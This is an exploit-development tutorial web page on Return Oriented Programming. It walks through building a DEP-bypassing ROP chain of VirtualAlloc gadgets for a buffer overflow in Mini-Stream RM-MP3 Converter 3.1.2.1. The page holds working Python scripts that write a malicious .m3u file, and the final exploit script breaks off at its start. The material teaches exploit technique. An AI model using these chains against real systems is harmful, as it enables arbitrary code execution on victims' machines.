<!DOCTYPE html>
<!--[if lt IE 7 ]><html class="ie ie6" lang="en"> <![endif]-->
<!--[if IE 7 ]><html class="ie ie7" lang="en"> <![endif]-->
<!--[if IE 8 ]><html class="ie ie8" lang="en"> <![endif]-->
<!--[if (gte IE 9)|!(IE)]><!--><html lang="en"> <!--<![endif]-->
<head>

  <!-- Basic Page Needs -->
  <meta charset="utf-8">
  <title>FuzzySecurity | ExploitDev: Part 7</title>
  <meta name="description" content="">
  <meta name="author" content="">

  <!-- CSS Style -->
  <link rel="stylesheet" href="../../css/style.css"> 
  
  <!-- Color Skins -->
  <link rel="stylesheet" href="../../css/skins/red.css" name="skins"> 
  
  <!-- Layout Style -->
  <link rel="stylesheet" href="../../css/layout/wide.css" name="layout"> 
  
  <!-- Small Icons -->
  <link rel="stylesheet" href="../../css/icons.css">  
  
  <!-- SyntaxHighlighter -->
  <link type="text/css" rel="stylesheet" href="../../css/shCoreEmacs.css"/>
  
  <!-- Start JavaScript -->
  
    <script src="../../js/jquery-1.7.2.min.js"></script> <!-- jQuery library -->
    <script src="../../js/jquery.easing.1.3.min.js"></script> <!-- jQuery Easing --> 
    <script src="../../js/jquery-ui.min.js"></script> <!-- jQuery Ui --> 
    <script src="../../js/jquery.cookie.js"></script> <!-- jQuery cookie --> 
    <script src="../../js/jquery.uniform.min.js"></script> <!-- jQuery Uniform -->
    <script src="../../js/ddsmoothmenu.js"></script> <!-- Nav Menu ddsmoothmenu -->
    <script src="../../js/jquery.flexslider.js"></script> <!-- Flex Slider  -->
    <script src="../../js/jquery.eislideshow.js"></script> <!-- Elastic Slider  -->
    <script src="../../js/jquery.iconmenu.js"></script> <!-- Sliding Text and Icon Menu Style  -->
    <script src="../../js/colortip.js"></script> <!-- Colortip Tooltip Plugin  -->
    <script src="../../js/tytabs.js"></script> <!-- jQuery Plugin tytabs  -->
    <script src="../../js/carousel.js"></script> <!-- jQuery Carousel  -->
    <script src="../../js/jquery.prettyPhoto.js"></script> <!-- jQuery Prettyphoto  -->
    <script src="../../js/jquery.isotope.min.js"></script> <!-- Isotope Filtering  -->
    <script src="../../js/selectnav.js"></script> <!-- Responsive Navigation Menu by SelectNav -->
    <script src="../../js/jquery.ui.totop.js"></script> <!-- UItoTop plugin  -->
    <script src="../../js/custom.js"></script> <!-- Custom Js file for javascript in html -->
    
    <!-- SyntaxHighlighter -->
	<script type="text/javascript" src="../../js/shCore.js"></script>
	<script type="text/javascript" src="../../js/shBrushPython.js"></script>
    <script type="text/javascript">SyntaxHighlighter.all();</script>
  
  <!-- End JavaScript -->

  <!--[if lt IE 9]>
      <script src="js/html5.js"></script>
  <![endif]-->

  <!-- Favicons -->
  <link rel="shortcut icon" href="../../images/favicon/favicon.ico">
  <link rel="apple-touch-icon" href="../../images/favicon/apple-touch-icon.png">
  <link rel="apple-touch-icon" sizes="72x72" href="../../images/favicon/apple-touch-icon-72x72.png">
  <link rel="apple-touch-icon" sizes="114x114" href="../../images/favicon/apple-touch-icon-114x114.png">

</head>
<body>

  <div id="wrap" class="boxed">

  <header>
    <div class="container clearfix">
    
      <div class="five columns">
        <div class="logo">
        <a href="index.html">
          <img src="../../images/logo.png" alt="FuzzySec" />
        </a>
        </div>
      </div><!-- End Logo -->
      
      <div class="eleven columns">
        <nav id="menu" class="navigation">
          <ul id="nav">
            <li><a href="../../index.html">Home</a>
            </li>
            <li><a href="../../tutorials.html" class="active">Tutorials</a>
            </li>
            <li><a href="../../coding.html">Scripting</a>
            </li>
            <li><a href="../../exploits.html">Exploits</a>
            </li>
            <li><a href="../../links.html">Links</a>
            </li>
            <li><a href="../../patreon.html">Patreon</a></li><li><a href="../../contact.html">Contact</a></li>
          </ul> 
        </nav>
      </div><!-- End Menu -->
      
      
      <div class="sixteen columns"><hr /></div>
      
    </div><!-- End Container -->
  </header><!-- <<< End Header >>> -->
  
  <div class="container clearfix">
  
    <div class="page-columns">
    
    <ul class="breadcrumbs">
      <li><a href="index.html"><span class="icon home gray"></span></a></li>
          <li><a href="../../index.html">Home</a> <b>&#187;</b></li>
          <li><a href="../../tutorials.html">Tutorials</a> <b>&#187;</b></li>
          <li>Return Oriented Programming</li>
      </ul>
      
      <!-- section 16 Columns -->
      
      <div class="recent-work gallery clearfix">
      <div class="eighteen columns bottom">
	<div style="height:20px;" align="right">
		<link type="text/css" rel="stylesheet" href="https://www.fuzzysecurity.com/css/patreon.css"/>
		<button class="btn btn-2 btn-2g"><a href="https://www.patreon.com/FuzzySec" target="_blank"><img src="https://c5.patreon.com/external/logo/become_a_patron_button.png" style="border-radius: 10px;height:40px;"></a></button>
	</div>
        <h2 class="title">Part 7: Return Oriented Programming<span class="line"></span></h2>
        <p><strong>&quot;Put your hands up! This is a ROPpery!!&quot;</strong>. So you have a cup of coffee, you have your thinking-cap on and you want to take stack exploitation to the next level. Well today we will be tackling ROP (Return Oriented Programming). Not unlike the previous tutorial we will be crafting the parameters to Windows API calls on the stack and then executing them. Just like all the other tutorial parts ROP will require you to do allot of work to get the hang of it. Again this tutorial doesn't and can't cover all there is to know. If you want a better understanding of ROP check out corelanc0d3r's primer <a href="https://www.corelan.be/index.php/2010/06/16/exploit-writing-tutorial-part-10-chaining-dep-with-rop-the-rubikstm-cube/">here</a>.</p><br />
        
          <p>To introduce this technique we will be creating a new exploit for &quot;Mini-Stream RM-MP3 Converter 3.1.2.1&quot;. There is one previous exploit for this program <a href="http://www.exploit-db.com/exploits/20116/">here</a>, but as you will see we are going to going to do something different and arguably more efficient!</p><br />

<p>Debugging Machine: Windows 7 (Any Windows 7 will do, I'm using Win7 Pro SP1)<br />
Badcharacters: <strong>&quot;\x00\x09\x0A&quot;</strong><br />
Vulnerable Software: <a href="http://www.exploit-db.com/wp-content/themes/exploit/applications/ce47c348747cd05020b242da250c0da3-Mini-streamRM-MP3Converter.exe">Download</a></p>
        
        <br />
      <div class="fourteen columns bottom">
      <h2 class="title">Introduction<span class="line"></span></h2>
      <p>So what is all this madness and why should you care about it? People have been abusing stack overflows for years. Whatever we may fault Microsoft for, and lets face it there is allot, years of stack-smashing hasn't escape their notice. As far as I'm aware, starting from WinXP SP2 and Win Server 2003 SP1, Windows has implemented a new security feature to prevent code execution from non-executable memory ranges. DEP (Data Execution Prevention) comes in two flavors.</p><br />
      
          <p><strong>Hardware Enforced DEP</strong>: The CPU marks pages of memory as non-executable.<br />
          <strong>Software Enforced DEP</strong>: Alternative for CPU's that do not support these features.</p><br />
          
          <p>CPU's that support hardware enforced DEP will refuse to execute code from memory ranges that have the non-executable (NX) bit set. The main reason for this is to prevent custom/malicious code to be inject into another program to then be executed. This was mainly implemented to put up hurdles for malware and stack-based exploits. However DEP can sometimes cause programs to behave in unintended and erroneous ways because it prevents legitimate processes from doing things they are supposed to do. To solve this problem DEP can be configured in two ways on your host operating system.</p><br />
          
          <p><strong>Opt-In Mode</strong>: DEP is only enabled for system processes and specifically defined programs.<br />
            <strong>Opt-Out Mode</strong>: DEP is enabled for all programs and services except those specifically/manually disabled.</p><br />
            
          <p>So what does this mean for exploit development? When we attempt to execute any code in a DEP enabled memory section (weather we are talking about EIP or shellcode) an access violation will occur &quot;STATUS_ACCESS_VIOLATION (0xc0000005)&quot; which will result in process termination. This is obviously bad for us! However the interesting thing about DEP is that it can be disabled on a per-process basis, what this means practically is that there are Windows API calls that can mark a range of memory as executable. The main problem remains though, if we can't execute any code how can we make the call to the Windows API functions?</p><br />
          
          <p>Enter Return Oriented Programming (ROP). This technique was first introduced by Sebastian Krahmer in 2005 on SUSE Linux, you can (and should hehe) read his paper <a href="http://www.suse.com/~krahmer/no-nx.pdf">here</a>. The basic idea is that we are going to borrow per-existing chunks of code (or as we will later call them gadgets) from loaded modules to create the parameters to our Windows API call. The reason this works is that we are allowed to &quot;execute&quot; one single kind of instruction while DEP is enabled, a RETN. Basically what RETN does is redirect execution to the next pointer on the stack. By performing a RETN we are not actually executing any code, in that sense it is kind of like DEP's version of a NOP. This should clarify the term Return Oriented Programming, we will fill the stack with pointers from application modules that contain sequences of instructions ending in a RETN. Chaining these sequences together will allow us to execute high level assembly computation. The following example should help to illustrate this.</p>
          
    <div class="terminal_wrap" style="background:#CCC">
      <pre>(1) All our pointers on the stack directly         (2) All our pointers on the stack reference a location
    reference a RETN.                                  in memory that contains instructions followed by
                                                       a RETN (=gadget).

ESP -> ???????? => RETN                            ESP -&gt; ???????? =&gt; POP EAX # RETN
       ???????? => RETN                                   ffffffff =&gt; we put this value in EAX
       ???????? => RETN                                   ???????? =&gt; INC EAX # RETN
       ???????? => RETN                                   ???????? =&gt; XCHG EAX,EDX # RETN

(1) In this case our RETN's will simply            (2) This is just an example but essentially we are
    increment ESP without doing anything.              zeroing out EDX using pre-existing instructions
                                                       that are located somewhere in the application 
                                                       without actally executing any code.</pre>
<br />
</div>

<p>&nbsp;</p>
<p>You get the idea right! We are going to enumerate all the ROP-Gadgets and then chain them together to craft our API call which will in turn disable DEP and allow us to execute our second stage payload. This technique relies on our ability to reliably predict where certain instruction will be located within a certain module so we can only use gadgets from modules that are non-rebase and non-aslr.</p><br />

          <p>There are many different API calls available across Windows Builds and Service Packs. This table taken from <a href="https://www.corelan.be/index.php/2010/06/16/exploit-writing-tutorial-part-10-chaining-dep-with-rop-the-rubikstm-cube/">corelan</a> gives a nice overview of what can be used to disable DEP based on Build and Service Pack.</p><p>&nbsp;</p>
    
          <img src="images/Big_rop1.png" alt="image1" />

<p>&nbsp;</p>
<p>As you see there is more than one way to skin a cat. Some methods are more universal than others. These different API Calls are properly documented on MSDN so take some time to read up on them and get a better grasp of the parameters they require. The OS modules will be ASLR enabled so in general we will see if the application modules contain pointers to any of these API Calls. Based on what is available we can then start to build our ROP-Chain.</p><br />

          <p>Basically there are two ways we can write our first stage ROP payload. (1) We can load all the API parameters into the various registers and use a PUSHAD instruction to push them to the stack in the proper order (this is what we will be doing today). Or (2) we can directly write the parameters to the stack in the proper order and then return to them (this will be more difficult).</p><br />
          
          <p>Finally I should mention that it is also possible to create an entire payload in ROP. This requires serious Ninja-skills and is much less practical than creating a ROP-Stager that disables DEP but it is way cool non the less hehe.</p>
          
      <h2 class="title">Gathering Primitives<span class="line"></span></h2>
<p>Exploit development is all about getting your facts straight. The more pieces of information you gather, the more clear everything will be, the quicker you will go from POC -> exploit. Let's kick things off with our POC, I have cheated a bit and modified the POC to give a basic buffer structure that overwrites EIP with four B's (I assume by now you should be able to use a metasploit pattern).</p>

    <div class="main_wrap_support">
<pre class="brush: py;gutter:false;auto-links: false;;">
#!/usr/bin/python

import sys, struct

file="crash.m3u"


#---------------------------------------------------------------------#
# Badchars: '\x00\x09\x0A'                                            #
#---------------------------------------------------------------------#
crash = "http://." + "A"*17416 + "B"*4 + "C"*7572

writeFile = open (file, "w")
writeFile.write( crash )
writeFile.close()</pre>
</div>
    
<p>Okay same old business, attach Mini-Stream to the debugger and open &quot;crash.m3u&quot;. You can see the resulting crash in the screenshot below. There are a couple of things to take notice of: (1) Our buffer is located in the ESP register which is good news because we can overwrite EIP with a simple RETN to get to our ROP-Chain and (2) we should take note that ESP points 4-bytes into our C-buffer so we will need to compensate those bytes later.</p><p>&nbsp;</p>

    
    <div class="four columns item element-4 Web Logo Animation" data-categories="Web Logo Animation">
          <div class="caption">
          <a href="images/Big_rop2.png" rel="prettyPhoto[part7]">
          <img src="images/Small_rop2.png" alt="" class="pic" />
          <span class="hover-effect zoom"></span></a>
          </div><!-- hover effect -->
          <p>EIP = 42424242</p>
      </div>

<p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>
<p>Good, we now have a basic idea about the memory layout. Lets break out mona and have a look at the loaded modules (remember non-rebase, non-ASLR and no badcharacters). Looks like there is only one dll that meets all our criteria (MSRMfilter03.dll). We can let mona do more of the heavy lifting by having it search for API pointers inside that dll which we can use for our ROP-Chain. You can see the results in the screenshots below.</p><br />

          <p><strong>!mona modules<br/>
            !mona ropfunc -m MSRMfilter03.dll -cpb '\x00\x09\x0a'</strong></p><p>&nbsp;</p>

    
    <div class="four columns item element-4 Web Logo Animation" data-categories="Web Logo Animation">
          <div class="caption">
          <a href="images/Big_rop3.png" rel="prettyPhoto[part7]">
          <img src="images/Small_rop3.png" alt="" class="pic" />
          <span class="hover-effect zoom"></span></a>
          </div><!-- hover effect -->
          <p>Modules</p>
      </div>
      
    <div class="four columns item element-4 Web Logo Animation" data-categories="Web Logo Animation">
          <div class="caption">
          <a href="images/Big_rop4.png" rel="prettyPhoto[part7]">
          <img src="images/Small_rop4.png" alt="" class="pic" />
          <span class="hover-effect zoom"></span></a>
          </div><!-- hover effect -->
          <p>Ropfunc</p>
      </div>

<p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>
<p>The final phase in the enumeration process is to have mona generate a list of ROP-Gadgets based on the module we selected this is btw one of the most amazing features of mona and a testament to the effort <a href="https://www.corelan.be/">corelanc0d3r</a> has put into it!! Mona will generate a couple of important files: "rop.txt" (a raw list of all the ROP-Gadgets), "rop_suggestions.txt" (a heavily filtered list of ROP-Gadgets based on function), "stackpivot.txt" (a list of gadgets that pivot ESP if you need them) and "rop_virtualprotect.txt" (which tries to build a ROP-Chain based on VirtualProtect). I suggest you keep these files open for easy reference, if you use notepad++ you can just have them open in separate tabs. Even though we are going to be building a chain based on VirtualAlloc, "rop_virtualprotect.txt" is still useful to look at as some basic gadgets we will need are in there.</p><br />
          <p><strong>!mona rop -m MSRMfilter03.dll -cpb '\x00\x09\x0a'</strong></p><p>&nbsp;</p>

    
    <div class="four columns item element-4 Web Logo Animation" data-categories="Web Logo Animation">
          <div class="caption">
          <a href="images/Big_rop5.png" rel="prettyPhoto[part7]">
          <img src="images/Small_rop5.png" alt="" class="pic" />
          <span class="hover-effect zoom"></span></a>
          </div><!-- hover effect -->
          <p>Generate Gadgets</p>
      </div>

<p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>
<h2 class="title">Building our ROP-Chain<span class="line"></span></h2>
<p>Before we get down to the serious stuff lets update our POC. Like we saw before we can overwrite EIP wit a pointer to RETN because our buffer is located in the ESP register. If you open &quot;rop.txt&quot; you can select any one of the instructions and modify the address so you just retain the RETN. While we are at it we’re going to set up a variable for our ROP-Chain and we won't forget to compensate those 4-bytes we noticed earlier.</p>
          
    <div class="main_wrap_support">
<pre class="brush: py;gutter:false;auto-links: false;;">
#!/usr/bin/python

import sys, struct

file="crash.m3u"

rop = struct.pack('&lt;L',0x41414141)  # padding to compensate 4-bytes at ESP


#---------------------------------------------------------------------#
# Badchars: '\x00\x09\x0a'                                            #
# kernel32.virtualalloc: 0x1005d060 (MSRMfilter03.dll)                #
# EIP: 0x10019C60 Random RETN (MSRMfilter03.dll)                      #
#---------------------------------------------------------------------#
crash = "http://." + "A"*17416 + "\x60\x9C\x01\x10" + rop + "C"*(7572-len(rop))

writeFile = open (file, "w")
writeFile.write( crash )
writeFile.close()</pre>
</div>

<p><p>Ok so far so good, lets have a look at VirtualAlloc. I suggest you take some time to read the documentation on MSDN to get a better understanding of the parameters we will be using.</p><br />
          <p>VirtualAlloc: <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa366887(v=vs.85).aspx">MSDN</a></p>
  
    <div class="terminal_wrap" style="background:#CCC">
<pre>Structure:                                 Parameters:

LPVOID WINAPI VirtualAlloc(          =&gt;    A pointer to VirtualAlloc()
  _In_opt_  LPVOID lpAddress,        =&gt;    Return Address (Redirect Execution to ESP)
  _In_      SIZE_T dwSize,           =&gt;    dwSize (0x1)
  _In_      DWORD flAllocationType,  =&gt;    flAllocationType (0x1000)
  _In_      DWORD flProtect          =&gt;    flProtect (0x40)
);</pre>
<br />
</div>

<p>&nbsp;</p>
<p>As you can see the structure of the API-Call is relatively simple most of the values we need to set are per-defined. For posterity I will also layout the structure of VirtualProtect as these to are the most common ROP-Stagers and they are universal API-Calls across all Windows builds.</p><br />
          <p>VirtualProtect: <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa366898(v=vs.85).aspx">MSDN</a></p>
          
    <div class="terminal_wrap" style="background:#CCC">
<pre>Structure:                                 Parameters:

BOOL WINAPI VirtualProtect(          =&gt;    A pointer to VirtualProtect()
  _In_   LPVOID lpAddress,           =&gt;    Return Address (Redirect Execution to ESP)
  _In_   SIZE_T dwSize,              =&gt;    dwSize up to you to chose as needed (0x201)
  _In_   DWORD flNewProtect,         =&gt;    flNewProtect (0x40)
  _Out_  PDWORD lpflOldProtect       =&gt;    A writable pointer
);</pre>
<br />
</div>

<p>&nbsp;</p>
<p>With this information in mind, lets update our POC so we have a clear picture of the steps we need to take to write our ROP-Chain.</p>

    <div class="main_wrap_support">
<pre class="brush: py;gutter:false;auto-links: false;;">
#!/usr/bin/python

import sys, struct

file="crash.m3u"

#---------------------------------------------------------[Structure]-#
# LPVOID WINAPI VirtualAlloc(         => PTR to VirtualAlloc          #
#   _In_opt_  LPVOID lpAddress,       => Return Address (Call to ESP) #
#   _In_      SIZE_T dwSize,          => dwSize (0x1)                 #
#   _In_      DWORD flAllocationType, => flAllocationType (0x1000)    #
#   _In_      DWORD flProtect         => flProtect (0x40)             #
# );                                                                  #
#---------------------------------------------------[Register Layout]-#
# Remember (1) the  stack  grows  downwards  so we  need to load the  #
# values into the registers in reverse order! (2) We are going to do  #
# some clever  trickery to  align our  return after  executing.  To   #
# acchieve this we will be filling EDI with a ROP-Nop and we will be  #
# skipping ESP leaving it intact.                                     #
#                                                                     #
# EAX 90909090 => Nop                                                 #
# ECX 00000040 => flProtect                                           #
# EDX 00001000 => flAllocationType                                    #
# EBX 00000001 => dwSize                                              #
# ESP ???????? => Leave as is                                         #
# EBP ???????? => Call to ESP (jmp, call, push,..)                    #
# ESI ???????? => PTR to VirtualAlloc - DWORD PTR of 0x1005d060       #
# EDI 10019C60 => ROP-Nop same as EIP                                 #
#---------------------------------------------------------------------#
rop = struct.pack('&lt;L',0x41414141)  # padding to compensate 4-bytes at ESP


#---------------------------------------------------------------------#
# Badchars: '\x00\x09\x0a'                                            #
# kernel32.virtualalloc: 0x1005d060 (MSRMfilter03.dll)                #
# EIP: 0x10019C60 Random RETN (MSRMfilter03.dll)                      #
#---------------------------------------------------------------------#
crash = "http://." + "A"*17416 + "\x60\x9C\x01\x10" + rop + "C"*(7572-len(rop))

writeFile = open (file, "w")
writeFile.write( crash )
writeFile.close()</pre>
</div>

<p>Our battle-plan now is to put together sequences of ROP-Gadgets that load the values listed above in to the proper registers. Once we have all the instructions, we need to shuffle them around because we need to remember some instructions will modify registers that we had set previously. Lets start by putting together some instructions that we can easily find and worry about the rest afterward. Remember you want to have the least possible amount of instructions per sequence.</p>

    <div class="terminal_wrap" style="background:#CCC">
<pre>(1) EDI -> We need to put a ROP-Nop in EDI
0x10029b57 # POP EDI # RETN
0x1002b9ff # ROP-Nop (we already have this value from EIP)

(2) EBP -> Redirect Execution flow to ESP
0x100532ed # POP EBP # RETN
0x100371f5 # CALL ESP (!mona jmp -r ESP -m MSRMfilter03.dll -cpb '\x00\x09\x0a')

(3) EAX -> Fill with a regular NOP
0x10030361 # POP EAX # RETN
0x90909090 # NOP (just a regular NOP)

(4) We need to end our chain with a PUSHAD
0x10014720 # PUSHAD # RETN (can be found in rop_virtualprotect.txt)</pre>
<br />
</div>

<p>&nbsp;</p>
<p>Ok so we have all the low-hanging fruit. The other gadgets will require some puzzling and creativity but with persistence you should be able to chain together the instructions that we need. The chain I will be making is definitely not the only option. There are probably quite a few ways to structure your gadgets and some will doubtlessly be more efficient. Time to dig in and sift through &quot;rop.txt&quot;..</p>

    <div class="terminal_wrap" style="background:#CCC">
<pre>(5) EBX -&gt; dwSize (0x1)
0x10013b1c # POP EBX # RETN
0xffffffff # will be 0x1 (EBX will be set to 0xffffffff)
0x100319d3 # INC EBX # FPATAN # RETN  \ Increasing EBX twice will set EBX to 0x00000001
0x100319d3 # INC EBX # FPATAN # RETN  /

(6) EDX -&gt; flAllocationType (0x1000)
0x1003fb3f # MOV EDX,E58B0001 # POP EBP # RETN (we move a static value into EDX for calculations)
0x41414141 # padding for POP EBP (compensation for the POP)
0x10013b1c # POP EBX # RETN
0x1A750FFF # ebx+edx => 0x1000 flAllocationType (FFFFFFFF-E58B0001=1A74FFFE =&gt; 1A74FFFE+00001001=1A750FFF)
0x10029f3e # ADD EDX,EBX # POP EBX # RETN 10 (when we add these valuse together the result is 0x00001000)
0x1002b9ff # Rop-Nop to compensate  \
0x1002b9ff # Rop-Nop to compensate   |
0x1002b9ff # Rop-Nop to compensate   | This is to compensate for the POP and RETN 10
0x1002b9ff # Rop-Nop to compensate   |
0x1002b9ff # Rop-Nop to compensate   |
0x1002b9ff # Rop-Nop to compensate  /

(7) ECX -&gt; flProtect (0x40)
(This technique works because EDX points to a valid memory location at run-time!! I tested this on windows
XP and there it didn't seem to be the case. It would be an interesting exercise to make this gadget more
universal.)
0x100280de # POP ECX # RETN
0xffffffff # will become 0x40 (ECX will be set to 0xffffffff)
0x1002e01b # INC ECX # MOV DWORD PTR DS:[EDX],ECX # RETN  \ ECX will be set to 0x00000001
0x1002e01b # INC ECX # MOV DWORD PTR DS:[EDX],ECX # RETN  /
0x1002a487 # ADD ECX,ECX # RETN  \
0x1002a487 # ADD ECX,ECX # RETN   |
0x1002a487 # ADD ECX,ECX # RETN   | Adding ECX to itself cycles ECX -&gt; 1,2,4,8,10,20,40 -&gt; 0x00000040
0x1002a487 # ADD ECX,ECX # RETN   |
0x1002a487 # ADD ECX,ECX # RETN   |
0x1002a487 # ADD ECX,ECX # RETN  /

(8) ESI -&gt; VirtualAlloc
(We already have a pointer to VirtualAlloc (0x1005d060) but we need the DWORD value that is located at
that pointer. Again here EBP points to a valid memory address (untested on XP).)
0x1002ba02 # POP EAX # RETN
0x1005d060 # kernel32.virtualalloc
0x10027f59 # MOV EAX,DWORD PTR DS:[EAX] # RETN (get the DWORD value located at 0x1005d060)
0x1005bb8e # PUSH EAX # ADD DWORD PTR SS:[EBP+5],ESI # PUSH 1 # POP EAX # POP ESI # RETN (EAX -&gt; ESI)</pre>
<br />
</div>

<p>&nbsp;</p>
<p>Some of these sequences seem a bit complicated but they are not to difficult to understand, take some time to look them over so you get a feeling for it. As you can see some of these gadgets manipulate several registers to load the proper value. We need to order our gadgets in a way that will not affect our ROP-Chain so just keep that in mind. Time to put things together and restructure our POC.</p>

    <div class="main_wrap_support">
<pre class="brush: py;gutter:false;auto-links: false;;">
#!/usr/bin/python

import sys, struct

file=&quot;crash.m3u&quot;

#---------------------------------------------------------[Structure]-#
# LPVOID WINAPI VirtualAlloc(         =&gt; PTR to VirtualAlloc          #
#   _In_opt_  LPVOID lpAddress,       =&gt; Return Address (Call to ESP) #
#   _In_      SIZE_T dwSize,          =&gt; dwSize (0x1)                 #
#   _In_      DWORD flAllocationType, =&gt; flAllocationType (0x1000)    #
#   _In_      DWORD flProtect         =&gt; flProtect (0x40)             #
# );                                                                  #
#---------------------------------------------------[Register Layout]-#
# Remember (1) the  stack  grows  downwards  so we  need to load the  #
# values into the registers in reverse order! (2) We are going to do  #
# some clever  trickery to  align our  return after  executing.  To   #
# acchieve this we will be filling EDI with a ROP-Nop and we will be  #
# skipping ESP leaving it intact.                                     #
#                                                                     #
# EAX 90909090 =&gt; Nop                                                 #
# ECX 00000040 =&gt; flProtect                                           #
# EDX 00001000 =&gt; flAllocationType                                    #
# EBX 00000001 =&gt; dwSize                                              #
# ESP ???????? =&gt; Leave as is                                         #
# EBP ???????? =&gt; Call to ESP (jmp, call, push,..)                    #
# ESI ???????? =&gt; PTR to VirtualAlloc - DWORD PTR of 0x1005d060       #
# EDI 10019C60 =&gt; ROP-Nop same as EIP                                 #
#---------------------------------------------------------------------#
rop = struct.pack('&lt;L',0x41414141)  # padding to compensate 4-bytes at ESP
rop += struct.pack('&lt;L',0x10029b57) # POP EDI # RETN
rop += struct.pack('&lt;L',0x1002b9ff) # ROP-Nop
                                    #-----------------------------------------[ROP-Nop -> EDI]-#
rop += struct.pack('&lt;L',0x100280de) # POP ECX # RETN
rop += struct.pack('&lt;L',0xffffffff) # will become 0x40
rop += struct.pack('&lt;L',0x1002e01b) # INC ECX # MOV DWORD PTR DS:[EDX],ECX # RETN
rop += struct.pack('&lt;L',0x1002e01b) # INC ECX # MOV DWORD PTR DS:[EDX],ECX # RETN
rop += struct.pack('&lt;L',0x1002a487) # ADD ECX,ECX # RETN
rop += struct.pack('&lt;L',0x1002a487) # ADD ECX,ECX # RETN
rop += struct.pack('&lt;L',0x1002a487) # ADD ECX,ECX # RETN
rop += struct.pack('&lt;L',0x1002a487) # ADD ECX,ECX # RETN
rop += struct.pack('&lt;L',0x1002a487) # ADD ECX,ECX # RETN
rop += struct.pack('&lt;L',0x1002a487) # ADD ECX,ECX # RETN
                                    #--------------------------------[flProtect (0x40) -> ECX]-#
rop += struct.pack('&lt;L',0x1002ba02) # POP EAX # RETN
rop += struct.pack('&lt;L',0x1005d060) # kernel32.virtualalloc
rop += struct.pack('&lt;L',0x10027f59) # MOV EAX,DWORD PTR DS:[EAX] # RETN
rop += struct.pack('&lt;L',0x1005bb8e) # PUSH EAX # ADD DWORD PTR SS:[EBP+5],ESI # PUSH 1 # POP EAX # POP ESI # RETN
                                    #------------------------------------[VirtualAlloc -> ESI]-#
rop += struct.pack('&lt;L',0x1003fb3f) # MOV EDX,E58B0001 # POP EBP # RETN
rop += struct.pack('&lt;L',0x41414141) # padding for POP EBP
rop += struct.pack('&lt;L',0x10013b1c) # POP EBX # RETN
rop += struct.pack('&lt;L',0x1A750FFF) # ebx+edx => 0x1000 flAllocationType
rop += struct.pack('&lt;L',0x10029f3e) # ADD EDX,EBX # POP EBX # RETN 10
rop += struct.pack('&lt;L',0x1002b9ff) # Rop-Nop to compensate
rop += struct.pack('&lt;L',0x1002b9ff) # Rop-Nop to compensate
rop += struct.pack('&lt;L',0x1002b9ff) # Rop-Nop to compensate
rop += struct.pack('&lt;L',0x1002b9ff) # Rop-Nop to compensate
rop += struct.pack('&lt;L',0x1002b9ff) # Rop-Nop to compensate
rop += struct.pack('&lt;L',0x1002b9ff) # Rop-Nop to compensate
                                    #-----------------------[flAllocationType (0x1000) -> EDX]-#
rop += struct.pack('&lt;L',0x100532ed) # POP EBP # RETN
rop += struct.pack('&lt;L',0x100371f5) # CALL ESP
                                    #----------------------------------------[CALL ESP -> EBP]-#
rop += struct.pack('&lt;L',0x10013b1c) # POP EBX # RETN
rop += struct.pack('&lt;L',0xffffffff) # will be 0x1
rop += struct.pack('&lt;L',0x100319d3) # INC EBX # FPATAN # RETN
rop += struct.pack('&lt;L',0x100319d3) # INC EBX # FPATAN # RETN
                                    #------------------------------------[dwSize (0x1) -> EBX]-#
rop += struct.pack('&lt;L',0x10030361) # POP EAX # RETN
rop += struct.pack('&lt;L',0x90909090) # NOP
                                    #---------------------------------------------[NOP -> EAX]-#
rop += struct.pack('&lt;L',0x10014720) # PUSHAD # RETN
                                    #----------------------------------------[PUSHAD -> pwnd!]-#

#---------------------------------------------------------------------#
# Badchars: '\x00\x09\x0a'                                            #
# kernel32.virtualalloc: 0x1005d060 (MSRMfilter03.dll)                #
# EIP: 0x10019C60 Random RETN (MSRMfilter03.dll)                      #
#---------------------------------------------------------------------#
crash = &quot;http://.&quot; + &quot;A&quot;*17416 + &quot;\x60\x9C\x01\x10&quot; + rop + &quot;C&quot;*(7572-len(rop))

writeFile = open (file, &quot;w&quot;)
writeFile.write( crash )
writeFile.close()</pre>
</div>

<p>You can step through the ROP-Chain in the debugger to verify everything works as intended. In the screenshot below you can see the call to VirtualAlloc is set up on the stack. Any payload we place after that call will be executed.</p><p>&nbsp;</p>

    
    <div class="four columns item element-4 Web Logo Animation" data-categories="Web Logo Animation">
          <div class="caption">
          <a href="images/Big_rop6.png" rel="prettyPhoto[part7]">
          <img src="images/Small_rop6.png" alt="" class="pic" />
          <span class="hover-effect zoom"></span></a>
          </div><!-- hover effect -->
          <p>VirtualAlloc()</p>
      </div>

<p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>
<h2 class="title">Shellcode + Game Over<span class="line"></span></h2>
<p>All that remains is to insert some shellcode as a second stage payload. We haven't managed to allocate a lot of memory so we are limited in space but I inserted SkyLined's calc shellcode (you can have a look <a href="http://code.google.com/p/win-exec-calc-shellcode/">here</a> if your interested). It is possible get more memory but I leave that up to the diligent reader to play with.</p>

    <div class="main_wrap_support">
<pre class="brush: py;gutter:false;auto-links: false;;">
#!/usr/bin/python

#----------------------------------------------------------------------------------#
# Exploit: Mini-stream RM-MP3 Converter 3.1.2.1 (*.m3u)                            #
# OS: Win7 Pro SP1                                                                 #
# Author: b33f (Ruben Boonen)                                                      #
# Software: http://www.exploit-db.com/wp-content/themes/exploit/applications       #
#          /ce47c348747cd05020b242da250c0da3-Mini-streamRM-MP3Converter.exe        #
#----------------------------------------------------------------------------------#
# This exploit was created for Part 7 of my Exploit Development tutorial           #
# series - http://www.fuzzysecurity.com/tutorials/expDev/7.html                    #
#----------------------------------------------------------------------------------#

import sys, struct

file=&quot;crash.m3u&quot;

#---------------------------------------------------------[Structure]-#
# LPVOID WINAPI VirtualAlloc(         =&gt; PTR to VirtualAlloc          #
#   _In_opt_  LPVOID lpAddress,       =&gt; Return Address (Call to ESP) #
